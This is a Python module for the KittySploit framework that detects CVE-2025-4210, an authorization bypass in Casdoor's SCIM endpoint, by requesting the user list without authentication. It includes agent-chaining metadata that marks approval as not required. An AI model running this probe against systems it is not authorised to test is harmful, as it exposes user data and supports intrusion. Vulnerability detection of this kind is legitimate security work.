#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Casdoor up to 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Casdoor - Authorization Bypass Detection',
        'description': 'Casdoor up to 1.811.0 contains an authorization bypass caused by manipulation in HandleScim function in controllers/scim.go, letting remote attackers bypass authorization, exploit requires remote access.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'casdoor', 'scim', 'auth-bypass', 'disclosure', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/casdoor/casdoor/commit/3d12ac8dc2282369296c3386815c00a06c6a92fe',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-4210',
        ],
        'cve': 'CVE-2025-4210',
    }

    def run(self):
        for path in ('/scim/v2/Users', '/api/scim/v2/Users'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('schemas', 'totalResults', 'Resources', 'givenName',)
            header_any = ('application/scim+json', 'application/json',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="Casdoor - Authorization Bypass detected",
                    path=path,
                )
                return True
        return False

